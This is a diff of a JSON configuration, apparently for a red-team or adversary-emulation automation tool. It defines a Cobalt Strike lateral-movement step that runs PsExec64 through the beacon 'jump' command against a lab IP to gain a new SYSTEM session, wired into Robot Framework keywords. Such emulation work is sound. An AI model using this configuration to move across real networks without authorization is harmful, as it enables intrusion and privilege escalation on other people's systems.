@@ -5,97 +5,44 @@
   "executionType": "cobalt_strike",
   "estimatedDuration": 20,
   "inputs": [
-    {
-      "id": "session",
-      "label": "Beacon Session",
-      "type": "session",
-      "required": true
-    }
+    { "id": "session", "label": "Beacon Session", "type": "session", "required": true }
   ],
   "outputs": [
-    {
-      "id": "lateral_session",
-      "label": "Lateral Session",
-      "type": "session",
-      "description": "New beacon on lateral target as SYSTEM"
-    }
+    { "id": "lateral_session", "label": "Lateral Session", "type": "session", "description": "New beacon on lateral target as SYSTEM" }
   ],
   "parameters": [
-    {
-      "id": "session",
-      "label": "Session",
-      "type": "string",
-      "required": true,
-      "placeholder": "${CURRENT_SESSION}",
-      "default": "${CURRENT_SESSION}"
-    },
-    {
-      "id": "targetIp",
-      "label": "Target IP",
-      "type": "string",
-      "required": true,
-      "placeholder": "${TARGET2}",
-      "default": "${TARGET2}"
-    },
-    {
-      "id": "listener",
-      "label": "Listener",
-      "type": "string",
-      "required": true,
-      "placeholder": "${HTTP_LISTENER}",
-      "default": "${HTTP_LISTENER}"
-    }
+    { "id": "targetIp",    "label": "Target IP",             "type": "string", "required": true,  "placeholder": "172.16.2.3", "default": "172.16.2.3" },
+    { "id": "listener",    "label": "Listener",              "type": "string", "required": true,  "placeholder": "HTTP",       "default": "HTTP"       },
+    { "id": "lateralWait", "label": "Lateral Wait (seconds)","type": "number", "required": false, "placeholder": "15",         "default": 15           }
   ],
   "requirements": {
     "c2Server": true,
-    "listeners": [
-      "HTTP"
-    ],
-    "payloads": [],
-    "libraries": [
-      "cobaltstrikec2/cobaltstrike.py"
-    ]
+    "listeners": ["HTTP"],
+    "libraries": ["cobaltstrikec2/cobaltstrike.py"]
   },
   "robotFramework": {
-    "keyword": "Lateral Move (PSExec)",
-    "keywordArgs": [
-      {
-        "param": "session",
-        "position": 1,
-        "sessionVariable": "CURRENT_SESSION"
-      },
-      {
-        "param": "targetIp",
-        "position": 2,
-        "variableRef": true,
-        "variableName": "TARGET2"
-      },
-      {
-        "param": "listener",
-        "position": 3,
-        "variableRef": true,
-        "variableName": "HTTP_LISTENER"
-      }
-    ],
-    "pythonCall": "Run Bjump",
-    "preKeywordLog": "=== Lateral Move PSExec \u2192 ${TARGET2} ===",
-    "documentation": "Lateral movement via PsExec64",
-    "tags": [
-      "lateral-movement",
-      "psexec"
-    ],
-    "libraries": [
-      "cobaltstrikec2/cobaltstrike.py"
-    ],
+    "keyword": "Run Bjump",
+    "libraries": ["cobaltstrikec2/cobaltstrike.py"],
     "variables": [
-      {
-        "name": "TARGET2",
-        "fromParam": "targetIp",
-        "scope": "suite",
-        "default": "172.16.2.3"
-      }
-    ]
+      { "name": "TARGET2",      "fromParam": "targetIp",    "default": "172.16.2.3", "scope": "suite" },
+      { "name": "LATERAL_WAIT", "fromParam": "lateralWait", "default": "15",         "scope": "suite" }
+    ],
+    "keywordArgs": [
+      { "param": "session",  "position": 1, "sessionVariable": "CURRENT_SESSION" },
+      { "staticValue": "psexec64", "position": 2 },
+      { "param": "targetIp", "position": 3, "variableRef": true, "variableName": "TARGET2"      },
+      { "param": "listener", "position": 4, "variableRef": true, "variableName": "HTTP_LISTENER" }
+    ],
+    "postKeywordStatements": [
+      "Sleep    ${LATERAL_WAIT}s",
+      "@{_lateral_sessions}=    Get Sessions By IP    ${TARGET2}",
+      "${CURRENT_SESSION}=    Set Variable    ${_lateral_sessions[0]}"
+    ],
+    "sessionVariable": "CURRENT_SESSION",
+    "preKeywordLog": "=== Lateral Move PSExec → ${TARGET2} ===",
+    "documentation": "Lateral movement via PsExec64",
+    "tags": ["lateral-movement", "psexec"]
   },
   "tactic": "TA0008",
-  "icon": "\ud83d\ude80"
+  "icon": "🚀"
 }
